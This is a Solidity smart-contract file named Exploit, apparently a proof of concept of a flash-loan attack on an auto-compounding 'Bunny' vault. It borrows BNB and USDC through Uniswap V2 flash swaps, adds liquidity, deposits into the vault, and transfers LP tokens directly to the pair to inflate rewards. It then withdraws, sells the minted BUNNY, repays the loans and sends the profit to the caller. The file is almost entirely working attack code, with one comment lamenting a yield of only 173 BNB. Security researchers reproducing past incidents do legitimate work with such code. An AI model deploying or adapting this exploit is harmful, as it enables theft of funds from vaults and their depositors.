// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IAutoCompoundVault {
    function depositAll() external;
    function deposit(uint256 _amount) external;
    function withdrawAllAndEarn() external;
}
//this poc just get 173 bnb. so bad
contract Exploit {
    IUniswapV2Factory private uniFactory;
    IUniswapV2Router02 private uniRouter;
    IUniswapV2Pair private usdcBnbPair;
    IUniswapV2Pair private bnbBunnyPair;
    IUniswapV2Pair private usdcDaiPair;
    IUniswapV2Pair private daiBnbPair;
    IAutoCompoundVault private vault;
    IERC20 private usdc;
    IERC20 private bnb;
    IERC20 private dai;
    IERC20 private bunny;

    uint256 borrowBnbAmount;
    uint256 borrowUsdcAmount;

    constructor(
        address _uniFactory,
        address _uniRouter,
        address _bnb,
        address _dai,
        address _usdc, 
        address _bunny
    ) {
        uniFactory = IUniswapV2Factory(_uniFactory);
        uniRouter = IUniswapV2Router02(_uniRouter);
        bnb = IERC20(_bnb);
        bnb.approve(_uniRouter, type(uint256).max);
        dai = IERC20(_dai);
        dai.approve(_uniRouter, type(uint256).max);
        usdc = IERC20(_usdc);
        usdc.approve(_uniRouter, type(uint256).max);
        bunny = IERC20(_bunny);
        bunny.approve(_uniRouter, type(uint256).max);
    }

    function start(address _vault) external {
        borrowBnbAmount = 2_999e18;
        borrowUsdcAmount = 900_000e18;
        vault = IAutoCompoundVault(_vault);
        usdcBnbPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(bnb)));
        bnbBunnyPair = IUniswapV2Pair(uniFactory.getPair(address(bunny),address(bnb)));
        usdcDaiPair = IUniswapV2Pair(uniFactory.getPair(address(usdc),address(dai)));
        daiBnbPair = IUniswapV2Pair(uniFactory.getPair(address(dai),address(bnb)));

        bool t0 = daiBnbPair.token0() == address(bnb);        
        if (t0) {
            daiBnbPair.swap(borrowBnbAmount, 0, address(this), new bytes(0x1));
        } else {
            daiBnbPair.swap(0, borrowBnbAmount, address(this), new bytes(0x1));
        }
        bnb.transfer(msg.sender, bnb.balanceOf(address(this)));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if (msg.sender == address(daiBnbPair)) {
            uint256 amount = amount0 > 0 ? amount0 : amount1; 
            //borrow usdc from usdcDaiPair
            bool t0 = usdcDaiPair.token0() == address(usdc);        
            if (t0) {
                usdcDaiPair.swap(borrowUsdcAmount, 0, address(this), new bytes(0x1));
            } else {
                usdcDaiPair.swap(0, borrowUsdcAmount, address(this), new bytes(0x1));
            }
            bnb.transfer(address(msg.sender), amount * 1000 / 997 + 1);
        } 
        else if (msg.sender == address(usdcDaiPair)) {
            uint256 amount = amount0 > 0 ? amount0 : amount1; 
            IERC20(address(usdcBnbPair)).approve(address(vault), type(uint256).max);
            IERC20(address(usdcBnbPair)).approve(address(uniRouter), type(uint256).max);

            uniRouter.addLiquidity(
                address(usdc), address(bnb),
                borrowUsdcAmount, borrowBnbAmount,
                0, 0,
                address(this),
                block.timestamp
            );
            //deposit lp to vault
            uint256 lpAmount = IERC20(address(usdcBnbPair)).balanceOf(address(this));
            vault.deposit(2e18);

            address[] memory path = new address[](2);
            //if there is any bnb left, dump bnb
            uint256 bnbAmount = bnb.balanceOf(address(this));
            if (bnbAmount > 0) {
                path[0] = address(bnb);
                path[1] = address(usdc);
                uniRouter.swapExactTokensForTokens(
                    bnbAmount,
                    0, 
                    path, 
                    address(this), 
                    block.timestamp
                );
            }
            //transfer all lptoken to usdcBnbPair
            IERC20(address(usdcBnbPair)).transfer(address(usdcBnbPair), lpAmount - 2e18);
            //withdraw all lptoken
            vault.withdrawAllAndEarn();
            //sell bunny
            path[0] = address(bunny);
            path[1] = address(bnb);
            uniRouter.swapExactTokensForTokens(
                bunny.balanceOf(address(this)), 
                0, 
                path, 
                address(this), 
                block.timestamp
            );    
            //burn lp
            uniRouter.removeLiquidity(
                address(usdc), address(bnb),
                IERC20(address(usdcBnbPair)).balanceOf(address(this)),
                0, 0,
                address(this),
                block.timestamp
            );
            //buy usdc to repay flashloan            
            uint256 needAmount = amount * 1000 / 997 + 1 - usdc.balanceOf(address(this));
            path[0] = address(bnb);
            path[1] = address(usdc);
            uint[] memory amounts = uniRouter.getAmountsIn(needAmount, path);
            uniRouter.swapExactTokensForTokens(
                amounts[0], 
                0,
                path, 
                address(this), 
                block.timestamp
            );

            usdc.transfer(address(msg.sender), usdc.balanceOf(address(this)));
        } else {
            revert("invalid pair");
        }
    }

}